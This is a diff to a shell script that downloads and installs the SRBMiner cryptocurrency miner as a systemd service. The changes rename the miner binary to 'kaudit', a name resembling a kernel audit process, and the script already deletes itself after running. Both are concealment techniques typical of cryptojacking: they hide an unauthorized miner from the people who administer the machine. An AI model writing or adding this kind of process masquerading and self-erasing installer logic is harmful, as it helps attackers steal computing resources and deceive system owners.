@@ -52,7 +52,7 @@ echo "[*] Starting SRBMiner Dual Mining Setup Script"
 SRB_URL="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.5/SRBMiner-Multi-2-8-5-Linux.tar.gz"
 SRB_ARCHIVE="/tmp/srb.tar.gz"
 SRB_DIR="/opt/srbminer"
-SRB_BINARY="$SRB_DIR/SRBMiner-MULTI"
+SRB_BINARY="$SRB_DIR/kaudit"
 SERVICE_FILE="/etc/systemd/system/srbminer.service"
 HUGE_PAGES=$((1280 + $(nproc)))
 
@@ -92,6 +92,12 @@ fi
 echo "[*] Unpacking SRBMiner to $SRB_DIR"
 sudo mkdir -p "$SRB_DIR"
 sudo tar -xzf "$SRB_ARCHIVE" -C "$SRB_DIR" --strip-components=1
+
+# Rename binary from SRBMiner-MULTI to kaudit
+if [ -f "$SRB_DIR/SRBMiner-MULTI" ]; then
+  sudo mv "$SRB_DIR/SRBMiner-MULTI" "$SRB_BINARY"
+fi
+
 sudo chmod +x "$SRB_BINARY"
 rm -f "$SRB_ARCHIVE"
 
@@ -125,11 +131,3 @@ echo "[*] Done! Use 'sudo journalctl -u srbminer -f' to view miner logs"
 
 # Delete this script after execution
 rm -f "$(realpath "$0")"
-
-
-
-
-
-
-
-
